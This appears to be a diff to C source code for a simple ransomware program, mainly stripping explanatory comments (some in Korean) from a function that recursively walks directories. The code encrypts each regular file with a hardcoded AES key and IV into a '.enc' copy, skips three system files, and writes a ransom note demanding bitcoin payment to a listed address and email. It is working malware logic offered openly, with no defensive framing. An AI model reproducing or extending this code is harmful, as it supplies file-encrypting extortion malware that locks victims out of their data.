@@ -42,32 +42,31 @@ int main()
 
 void ls_dir(char* start_path)
 {
-    unsigned char key[] = "12345678901234561234567890123456";                                               //32 char 256bit key
-    unsigned char iv[] = "1234567890123456";                                                                //same size as block 16 char 128 bit block, init vector: 알고리즘 수행 시 넣는 값
-  
-    DIR* dir;                                                                                                   //dir = opendir(start_path)의 반환값을 가짐
-    struct dirent *ent;                                                                                         //ent = 개방한 파일(readdir(dir))의 정보를 저장할 구조체 변수
+    unsigned char key[] = "12345678901234561234567890123456";                                              
+    unsigned char iv[] = "1234567890123456";                                                               
+    DIR* dir;                                                                                                 
+    struct dirent *ent;                                                                                        
     if((dir=opendir(start_path)) !=NULL)
     {
         while((ent=readdir(dir)) !=NULL)
         {
             int len = strlen(ent->d_name);
             const char* last_four = &ent->d_name[len-4];
-            if(strcmp(last_four,".enc") != 0)                                                                   //0: 일치, 암호화 파일의 확장자: .enc
+            if(strcmp(last_four,".enc") != 0)                                                                  
             {
-                if(ent->d_type == 8)                                                                            // DT_REG == this is a regular file
+                if(ent->d_type == 8)                                                                            
                 {
-                    char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);    // full_path_readme = '/home/RANSOMEWARE_INFO\n'
-                    strcpy(full_path_readme,start_path);                                                        // full_path_readme = ' '/home/' '
-                    strcat(full_path_readme,"RANSOMEWARE_INFO");                                                // full_path_readme = ' '/home/' + 'RANSOMEWARE_INFO\n'
-                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);                  // full_path = '/home/ent->d_name'
+                    char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);   
+                    strcpy(full_path_readme,start_path);                                                        
+                    strcat(full_path_readme,"RANSOMEWARE_INFO");                                                
+                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);                 
                     strcpy(full_path,start_path);
-                    strcat(full_path,ent->d_name);                                                              // ?
-                    char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);                        // new_name = full_path.enc
+                    strcat(full_path,ent->d_name);                                                             
+                    char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);                       
                     strcpy(new_name,full_path);
                     strcat(new_name,".enc");
                     
-                    if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)   //?
+                    if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)   
                     {
                         FILE* fpin;     
                         FILE* fpout;    
@@ -76,12 +75,11 @@ void ls_dir(char* start_path)
                         fpin=fopen(full_path,"rb");
                         fpout=fopen(new_name,"wb");
                         
-                        fpreadme=fopen(full_path_readme,"w");                                                   //? in the all directory?
+                        fpreadme=fopen(full_path_readme,"w");                                                 
                         fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
                         fclose(fpreadme);
-                        //full_path_readme_count++;
-                        
-                        encryptfile(fpin,fpout,key,iv);                                                         //encryption
+                                                
+                        encryptfile(fpin,fpout,key,iv);                                                       
                         
                         fclose(fpin);
                         fclose(fpout);
@@ -91,16 +89,16 @@ void ls_dir(char* start_path)
                     free(full_path);
                     free(new_name);
                 }
-                else if(ent->d_type==4)                                                                         //DT_DIR == this is a directory file
+                else if(ent->d_type==4)                                                                         
                 {
                     char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
-                    strcpy(full_path,start_path);                                                               // full_path_readme = ' '/home/' '
-                    strcat(full_path,ent->d_name);                                                              // full_path = '/home/ent->d_name'
-                    strcat(full_path,"/");                                                                      // full_path = '/home/ent->d_name'
+                    strcpy(full_path,start_path);                                                               
+                    strcat(full_path,ent->d_name);                                                              
+                    strcat(full_path,"/");                                                                     
                     printf("%s\n",full_path);
                     if(full_path != start_path && ent->d_name[0] != '.')
                     {
-                        ls_dir(full_path);                                                                      // ?
+                        ls_dir(full_path);                                                                      
                     }
                     
                     free(full_path);
